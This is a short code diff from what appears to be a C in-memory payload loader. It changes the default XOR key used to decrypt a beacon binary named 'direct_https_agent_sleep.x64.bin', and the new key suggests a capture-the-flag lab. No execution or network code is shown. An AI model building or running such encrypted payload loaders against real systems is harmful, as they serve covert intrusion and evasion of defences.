@@ -58,7 +58,7 @@ static void xor_crypt(unsigned char* buf, size_t size, const char* key)
 int main(int argc, char** argv)
 {
     const char* binPath = argc > 1 ? argv[1] : "direct_https_agent_sleep.x64.bin";
-    const char* key = argc > 2 ? argv[2] : "CHANGE_ME_MEMORY_LOADER_KEY";
+    const char* key = argc > 2 ? argv[2] : "ctf-memory-loader-key-20260624";
     unsigned char* payload = NULL;
     size_t payloadSize = 0;
 
